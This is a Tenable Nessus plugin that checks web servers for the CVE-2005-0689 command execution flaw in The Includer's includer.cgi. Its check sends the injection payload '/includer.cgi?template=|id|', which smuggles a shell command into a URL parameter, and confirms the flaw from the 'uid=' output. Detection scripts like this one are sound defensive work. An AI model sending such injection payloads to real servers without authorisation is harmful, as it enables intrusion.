#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20296);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-0689");
  script_bugtraq_id(12738);
  script_osvdb_id(14624);

  script_name(english:"The Includer includer.cgi Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote code execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running The Includer, a PHP script for emulating
server-side includes. 

The version of The Includer installed on the remote host allows an
attacker to execute arbitrary shell commands by including shell
metacharacters as part of the URL." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=111021730710779&w=2" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/08");
 script_cvs_date("$Date: 2011/11/28 21:39:46 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
  script_summary(english:"The Includer remote command execution detection");
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/includer", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  req = http_get(
    item:string(
      dir, "/includer.cgi?",
      "template=", SCRIPT_NAME
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  if (
    "document.write" >< res &&
    "uid=" >!< res
  ) {
    http_check_remote_code (
      unique_dir:dir,
      check_request:"/includer.cgi?template=|id|",
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      port:port
    );
  }
}
